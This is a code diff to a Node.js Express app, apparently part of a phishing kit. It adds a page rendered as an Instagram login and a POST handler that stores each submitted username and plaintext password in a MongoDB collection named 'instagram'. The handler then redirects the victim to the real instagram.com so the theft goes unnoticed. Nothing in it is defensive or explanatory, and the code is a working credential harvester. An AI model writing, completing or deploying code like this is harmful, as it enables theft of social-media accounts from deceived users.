@@ -84,4 +84,25 @@ app.get("/", function (req, res) {
       }
     });
 });
+
+// Instagram Login Page
+app.get("/instagram/login/page", (req, res) => {
+  res.render("instagram_login");
+});
+
+// POST – write to DB and redirect
+app.post("/instagram/login/page", (req, res) => {
+  const { username, password } = req.body;
+
+  db.collection("instagram").insertOne(
+    { username, password, date: new Date() },
+    (err, result) => {
+      if (err) return res.send("Xatolik bo'ldi");
+
+      console.log("✅ Bazaga saqlandi:", result.insertedId);
+      res.redirect("https://www.instagram.com");
+    }
+  );
+});
+
 module.exports = app;
